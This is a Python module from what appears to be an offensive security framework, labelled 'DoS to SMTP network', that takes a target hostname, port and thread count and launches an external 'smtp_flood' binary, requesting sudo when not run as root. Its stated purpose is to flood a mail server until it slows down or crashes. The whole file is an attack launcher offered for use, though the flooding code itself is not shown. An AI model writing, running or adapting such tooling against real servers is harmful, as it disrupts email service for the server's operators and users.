import subprocess
import os
from rootmap import ROOT

MOD_INFO = {
    "Name": "DoS to SMTP network",
    "Description": """
Flooding an SMTP network to disrupt email services
until it is slow and even the server crashes.
""",
    "Author": ["zxelzy"],
    "Action": [
        ["DoS", {"Description": "Sending strange requests"}],
    ],
    "DefaultAction": "DoS",
    "License": "SMF License",
}
REQUIRED_OPTIONS = {
    "HOSTNAME": "ex: mail.storm.com",
    "PORT": "ex: 25",
    "THREAD": "ex: 1000",
}


def execute(options):
    target = str(options.get("HOSTNAME"))
    port = str(options.get("PORT"))
    threads = str(options.get("THREAD"))

    bindir = os.path.join(ROOT, "external", "source", "out")
    out_dir = os.path.join(bindir, "mod", "aux", "dos", "smtp")
    bin_path = os.path.join(out_dir, "smtp_flood")
    if not target:
        print("[-] Target is missing!")
        return

    if not os.path.exists(bin_path):
        return

    if os.getuid() == 0:
        command = [bin_path, "-t", target, "-p", port, "-w", threads]
    else:
        print("[!] This module requires root. Requesting sudo...")
        command = ["sudo", bin_path, "-t", target, "-p", port, "-w", threads]

    print(f"[*] Starting SMTP Flood on {target}")
    try:
        process = subprocess.Popen(command, stdout=None, stderr=None)
        process.wait()
    except KeyboardInterrupt:
        process.terminate()
        print("\n[!] SMTP Flood stopped.")
